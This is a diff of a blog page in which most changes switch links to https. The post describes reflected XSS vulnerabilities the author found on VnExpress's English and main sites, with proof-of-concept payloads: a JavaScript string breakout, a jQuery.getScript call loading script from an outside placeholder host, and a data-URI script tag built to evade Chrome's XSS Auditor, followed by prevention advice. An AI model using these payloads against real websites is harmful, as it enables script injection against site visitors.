@@ -12,16 +12,16 @@
   
   
 
-  <meta name="generator" content="Hugo 0.15" />
+  <meta name="generator" content="Hugo 0.16" />
 
-  <link rel="alternate" href="http://blog.ntcong.it/index.xml" type="application/rss+xml" title="CongNT">
+  <link rel="alternate" href="https://blog.ntcong.it/index.xml" type="application/rss+xml" title="CongNT">
 
   <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" />
-  <link rel="stylesheet" href="http://blog.ntcong.it/css/bootstrap.min.css" />
-  <link rel="stylesheet" href="http://blog.ntcong.it/css/main.css" />
+  <link rel="stylesheet" href="https://blog.ntcong.it/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="https://blog.ntcong.it/css/main.css" />
   <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
   <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
-  <link rel="stylesheet" href="http://blog.ntcong.it/css/pygment_highlights.css" />
+  <link rel="stylesheet" href="https://blog.ntcong.it/css/pygment_highlights.css" />
   
   
   <meta property="og:title" content="XSS vulnerabilities on VnExpress" />
@@ -43,7 +43,7 @@
         <span class="icon-bar"></span>
         <span class="icon-bar"></span>
       </button>
-      <a class="navbar-brand" href="http://blog.ntcong.it/">CongNT</a>
+      <a class="navbar-brand" href="https://blog.ntcong.it/">CongNT</a>
     </div>
 
     <div class="collapse navbar-collapse" id="main-navbar">
@@ -51,7 +51,7 @@
       
         
           <li>
-          <a title="About" href="/about/">About</a>
+          <a title="About" href="/about">About</a>
   	      </li>
   	    
       
@@ -67,8 +67,8 @@
 	<div class="avatar-container">
 	  <div class="avatar-img-border">
       
-          <a title="CongNT" href="http://blog.ntcong.it/">
-              <img class="avatar-img" src="http://blog.ntcong.it//img/avatar.png" alt="CongNT" />
+          <a title="CongNT" href="https://blog.ntcong.it/">
+              <img class="avatar-img" src="https://blog.ntcong.it//img/avatar.png" alt="CongNT" />
           </a>
       
 	  </div>
@@ -116,7 +116,7 @@
       <article role="main" class="blog-post">
           
 
-<h1 id="xss-on-e-vnexpress-net:3b2adbfb4f5b591fc123309bb7eb9de1">XSS on e.vnexpress.net</h1>
+<h1 id="xss-on-e-vnexpress-net">XSS on e.vnexpress.net</h1>
 
 <p>Recently I found two XSS vulnerabilities on vnExpress website. It all begins with the newly introduced English version of VnExpress, and I didn&rsquo;t have to spend a lot of time to find the search box wasn&rsquo;t escaped properly. Just do a search with &ldquo;&gt; will reveal this.</p>
 
@@ -140,18 +140,18 @@
 
 <p>But it&rsquo;s still not very good since it only works on Firefox, so I did a quick look at the HTML source code and found this</p>
 
-<div class="highlight"><pre><code class="language-js" data-lang="js"><span></span><span class="kd">var</span> <span class="nx">strKeyWord</span>  <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="o">&gt;</span><span class="err">&quot;</span><span class="p">;</span>
+<div class="highlight"><pre><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">strKeyWord</span>  <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="o">&gt;</span><span class="err">&quot;</span><span class="p">;</span>
 <span class="kd">var</span> <span class="nx">blData</span>      <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 </code></pre></div>
 
 
 <p>Why they include the search parameter on a Javascript code, without any protection is beyond me, but this will bypass all the protection XSS Auditor provides to you, because it&rsquo;s not a normal XSS payload anymore, any text you inputed in will run on javascript directly. The new payload will look like this.
-<div class="highlight"><pre><code class="language-js" data-lang="js"><span></span><span class="s2">&quot;;alert(1);&quot;</span>
+<div class="highlight"><pre><code class="language-js" data-lang="js"><span class="s2">&quot;;alert(1);&quot;</span>
 </code></pre></div>
 </p>
 
 <p>And it will not be detected by Chrome or IE&rsquo;s XSS Auditor. Extensible is a must, so I load the script from outside
-<div class="highlight"><pre><code class="language-js" data-lang="js"><span></span><span class="s2">&quot;;jQuery.getScript(&quot;</span><span class="nx">http</span><span class="o">:</span><span class="c1">//js.js&quot;) .done(function() {});&quot;</span>
+<div class="highlight"><pre><code class="language-js" data-lang="js"><span class="s2">&quot;;jQuery.getScript(&quot;</span><span class="nx">http</span><span class="o">:</span><span class="c1">//js.js&quot;) .done(function() {});&quot;</span>
 </code></pre></div>
 </p>
 
@@ -159,7 +159,7 @@
 
 <p>What should I do to prevent it? Well XSS is never a simple problem to begin with, but at least never ever trust anything the user input, escape it, whitelist the character, make sure they don&rsquo;t input any special characacter, because no one want to search an article with &ldquo;;&rdquo;@(alert(1));&rdquo; anyway. And NEVER use the input directly onto your javascript, it is very dangerous.</p>
 
-<h1 id="xss-on-vnexpress-net:3b2adbfb4f5b591fc123309bb7eb9de1">XSS on vnexpress.net</h1>
+<h1 id="xss-on-vnexpress-net">XSS on vnexpress.net</h1>
 
 <p>Then I thought, if they fucked up this bad on their new site, the main site should have some weakness as well. One thing they did a little better is, the main search box is properly escaped, but I noticed they put the whole URL onto the Time and Sort filter, so maybe something will not be escaped, like the &ldquo;search_f=&rdquo; parameter.</p>
 
@@ -184,9 +184,9 @@
 
 <p>So Chrome did a great job to find a XSS payload on the URL, and prevent it from running. But there&rsquo;s a flaw: it won&rsquo;t stop an invalid XSS payload, like a script without closing tag. And the HTML parse won&rsquo;t care about the content inside the <script> tag, as long as you include a src attribute. This payload requires you to have a closing </script> tag, which most website nowaday have to execute javascript after the main content finishes loading. The payload looks like this</p>
 
-<p><div class="highlight"><pre><code class="language-js" data-lang="js"><span></span><span class="err">&quot;</span><span class="o">&gt;&lt;</span><span class="nx">script</span><span class="o">/</span><span class="nx">src</span><span class="o">=</span><span class="nx">data</span><span class="o">:</span><span class="p">,</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">26</span><span class="nx">sol</span><span class="p">;</span><span class="o">%</span><span class="mi">26</span><span class="nx">sol</span><span class="p">;</span>
+<div class="highlight"><pre><code class="language-js" data-lang="js"><span class="err">&quot;</span><span class="o">&gt;&lt;</span><span class="nx">script</span><span class="o">/</span><span class="nx">src</span><span class="o">=</span><span class="nx">data</span><span class="o">:</span><span class="p">,</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">26</span><span class="nx">sol</span><span class="p">;</span><span class="o">%</span><span class="mi">26</span><span class="nx">sol</span><span class="p">;</span>
 </code></pre></div>
-</p>
+
 
 <p>The result html will looks like this: &lt;script src=&ldquo;data:,alert(1)//&amp;q=xss&hellip;.&ldquo;&gt;[a lot of HTML]&lt;/script&gt;. Andddd it runs on Chrome. And also it&rsquo;s pretty funny to see VnExpress do some weird shit with their site, results in the alert(1) display several times when the page loads (view count increase maybe?)</p>
 
@@ -197,12 +197,12 @@
       <ul class="pager blog-pager">
         
         <li class="previous">
-          <a href="http://blog.ntcong.it/post/how-vcb-do-otp-or-how-not-to-do-it/" data-toggle="tooltip" data-placement="top" title="How VCB OTP works and How not to do it">&larr; Previous Post</a>
+          <a href="https://blog.ntcong.it/post/how-vcb-do-otp-or-how-not-to-do-it/" data-toggle="tooltip" data-placement="top" title="How VCB OTP works and How not to do it">&larr; Previous Post</a>
         </li>
         
         
         <li class="next">
-          <a href="http://blog.ntcong.it/post/for2-google-ctf-write-up/" data-toggle="tooltip" data-placement="top" title="Forensics:For2 Google&#39;s CTF Writeup">Next Post &rarr;</a>
+          <a href="https://blog.ntcong.it/post/for2-google-ctf-write-up/" data-toggle="tooltip" data-placement="top" title="Forensics:For2 Google&#39;s CTF Writeup">Next Post &rarr;</a>
         </li>
         
       </ul>
@@ -212,9 +212,9 @@
         <div id="disqus_thread"></div>
 <script type="text/javascript">
     var disqus_shortname = 'ntcongit';
-    var disqus_identifier = 'http:\/\/blog.ntcong.it\/post\/xss-with-vnexpress\/';
+    var disqus_identifier = 'https:\/\/blog.ntcong.it\/post\/xss-with-vnexpress\/';
     var disqus_title = 'XSS vulnerabilities on VnExpress';
-    var disqus_url = 'http:\/\/blog.ntcong.it\/post\/xss-with-vnexpress\/';
+    var disqus_url = 'https:\/\/blog.ntcong.it\/post\/xss-with-vnexpress\/';
 
     (function() {
         var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
@@ -239,9 +239,9 @@
           <div id="disqus_thread"></div>
 <script type="text/javascript">
     var disqus_shortname = 'ntcongit';
-    var disqus_identifier = 'http:\/\/blog.ntcong.it\/post\/xss-with-vnexpress\/';
+    var disqus_identifier = 'https:\/\/blog.ntcong.it\/post\/xss-with-vnexpress\/';
     var disqus_title = 'XSS vulnerabilities on VnExpress';
-    var disqus_url = 'http:\/\/blog.ntcong.it\/post\/xss-with-vnexpress\/';
+    var disqus_url = 'https:\/\/blog.ntcong.it\/post\/xss-with-vnexpress\/';
 
     (function() {
         var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
@@ -315,7 +315,7 @@
           
 
     		  <li>
-      			<a href="http://blog.ntcong.it/index.xml" title="RSS">
+      			<a href="https://blog.ntcong.it/index.xml" title="RSS">
       			  <span class="fa-stack fa-lg">
         				<i class="fa fa-circle fa-stack-2x"></i>
         				<i class="fa fa-rss fa-stack-1x fa-inverse"></i>
@@ -331,7 +331,7 @@
     		  
     		  
     		  &nbsp;&bull;&nbsp;
-    		  <a href="http://blog.ntcong.it/">CongNT</a>
+    		  <a href="https://blog.ntcong.it/">CongNT</a>
     		  
   	    </p>
   	        
@@ -344,9 +344,9 @@
   </div>
 </footer>
 
-<script src="http://blog.ntcong.it/js/jquery-1.11.2.min.js"></script>
-<script src="http://blog.ntcong.it/js/bootstrap.min.js"></script>
-<script src="http://blog.ntcong.it/js/main.js"></script>
+<script src="https://blog.ntcong.it/js/jquery-1.11.2.min.js"></script>
+<script src="https://blog.ntcong.it/js/bootstrap.min.js"></script>
+<script src="https://blog.ntcong.it/js/main.js"></script>
 
 
 <script>
